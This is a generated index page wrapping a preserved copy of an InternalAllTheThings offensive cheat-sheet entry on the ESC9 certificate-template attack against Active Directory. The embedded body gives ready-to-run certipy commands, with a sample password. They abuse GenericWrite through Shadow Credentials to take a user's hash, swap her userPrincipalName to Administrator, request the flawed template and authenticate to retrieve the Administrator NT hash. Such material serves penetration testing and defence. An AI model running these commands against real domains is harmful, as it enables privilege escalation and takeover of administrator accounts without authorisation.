---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC9

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc09` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc09.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC9](../../topics/active-directory/active-directory-certificate-esc9.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc09 |
| name | Active Directory - Certificate ESC9 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc09.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC9\n\n## ESC9 - No Security Extension\n\n**Requirements**\n\n* `StrongCertificateBindingEnforcement`\
  \ set to `1` (default) or `0`\n* Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag`\
  \ value\n* Certificate specifies `Any Client` authentication EKU\n* `GenericWrite` over any account A to compromise any\
  \ account B\n\n**Scenario**\n\n<John@corp.local> has **GenericWrite** over <Jane@corp.local>, and we want to compromise\
  \ <Administrator@corp.local>.\n<Jane@corp.local> is allowed to enroll in the certificate template ESC9 that specifies the\
  \ **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value.\n\n* Obtain the hash of Jane with Shadow\
  \ Credentials (using our GenericWrite)\n\n    ```ps1\n    certipy shadow auto -username John@corp.local -p Passw0rd -account\
  \ Jane\n    ```\n\n* Change the **userPrincipalName** of Jane to be Administrator. :warning: leave the `@corp.local` part\n\
  \n    ```ps1\n    certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator\n  \
  \  ```\n\n* Request the vulnerable certificate template ESC9 from Jane's account.\n\n    ```ps1\n    certipy req -username\
  \ jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9\n    # userPrincipalName in the certificate is Administrator\
  \ \n    # the issued certificate contains no \"object SID\"\n    ```\n\n* Restore userPrincipalName of Jane to <Jane@corp.local>.\n\
  \n    ```ps1\n    certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local\n    ```\n\n\
  * Authenticate with the certificate and receive the NT hash of the <Administrator@corp.local> user.\n\n    ```ps1\n    certipy\
  \ auth -pfx administrator.pfx -domain corp.local\n    # Add -domain <domain> to your command line since there is no domain\
  \ specified in the certificate.\n    ```\n\n## References\n\n* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March\
  \ 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)"
_relative_path: active-directory/ad-adcs-esc09.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc09.md
````
